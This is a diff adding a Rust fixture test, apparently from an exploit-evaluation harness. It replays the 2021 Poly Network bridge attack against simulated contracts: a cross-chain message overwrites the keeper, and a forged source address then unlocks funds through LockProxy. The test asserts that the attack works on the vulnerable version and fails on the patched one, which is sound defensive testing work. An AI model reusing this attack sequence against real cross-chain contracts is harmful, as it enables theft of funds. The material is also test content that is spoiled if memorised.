@@ -1521,6 +1521,52 @@ mod fixture_tests {
     }
 
     #[test]
+    fn polynetwork_2021_official_exploit_and_patch() {
+        // Two steps. (1) via the faithful relay, a crossChain message targets
+        // ECCD.putCurEpochConPubKeyBytes to replace the keeper with the attacker
+        // (the relay reports the attacker's true source address, which ECCD's
+        // owner-only setter ignores). (2) now the keeper, the attacker calls the
+        // manager directly and forges fromContract = the registered source proxy
+        // so LockProxy.unlock pays out. Patched: the message may not target ECCD,
+        // the keeper is never replaced, and step 2 fails the keeper check.
+        let Some((vuln, patched)) = eval("polynetwork", |w| {
+            let set_keeper_args = Token::Bytes(ethers_core::abi::encode(&[addr_tok(attacker())]));
+            let unlock_args = Token::Bytes(ethers_core::abi::encode(&[
+                addr_tok(attacker()),
+                Token::Uint(parse_uint("500000e18").unwrap()),
+            ]));
+            vec![
+                // step 1: source crossChain -> faithful relay -> replace keeper
+                ucall(
+                    w,
+                    "SourceCrossChain",
+                    "crossChain",
+                    vec![
+                        contract_tok(w, "EthCrossChainData"),
+                        Token::String("putCurEpochConPubKeyBytes(address,address)".into()),
+                        set_keeper_args,
+                    ],
+                ),
+                // step 2: direct manager call as the (now attacker-controlled) keeper
+                ucall(
+                    w,
+                    "EthCrossChainManager",
+                    "verifyHeaderAndExecuteTx",
+                    vec![
+                        contract_tok(w, "LockProxy"),
+                        Token::String("unlock(address,uint256,address)".into()),
+                        unlock_args,
+                        contract_tok(w, "SrcDeposit"), // forged fromContract = registered proxy
+                    ],
+                ),
+            ]
+        }) else {
+            return;
+        };
+        assert_exploit("polynetwork", &vuln, &patched);
+    }
+
+    #[test]
     fn nomad_official_exploit_and_patch() {
         let Some((vuln, patched)) = eval("nomad", |w| {
             // Attacker calls the destination release entrypoint directly with a
